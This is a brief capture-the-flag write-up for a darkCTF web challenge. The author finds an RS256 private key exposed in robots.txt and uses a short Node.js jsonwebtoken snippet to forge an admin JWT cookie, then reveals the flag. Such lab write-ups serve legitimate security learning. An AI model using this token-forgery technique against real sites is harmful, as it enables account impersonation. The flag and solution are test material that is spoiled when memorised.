Challenge Title: Web-2
Description
Okay this time I added the login form and I m verifying the tokens too
Flag format: darkCTF{FLAG}
Link
Solution
On opening the link we see a login form, log in with any junk user and pass we get redirected to /flag which says Not admin, no flag for you hmmm...
On checking cookies we see there is key token with some value which is JWT again xD, checking it on [jwt.io] get this

The token is using RS256 algorithm which means it needs a private key and a public key 
On accessing /robots.txt and a little bit of scrolling xD we see there is some PRIVATE KEY   
So we have the private key now then we can build a token and apply the signature to it. I used nodejs jsonwebtoken to do this stuff 

const jwt = require('jsonwebtoken')
var fs = require('fs')
var private_key = fs.readFileSync('./private_key.key');
var token = jwt.sign({ 'user': 'admin' },private_key, { algorithm:'RS256',noTimestamp:true}); 
console.log(token)


Now access the /flag using the token as cookie and we get the flag

flag -> darkCTF{n07_4_900d_p14c3_f0r_prv473k3y}
What was the Bug?
Hide your private key xD
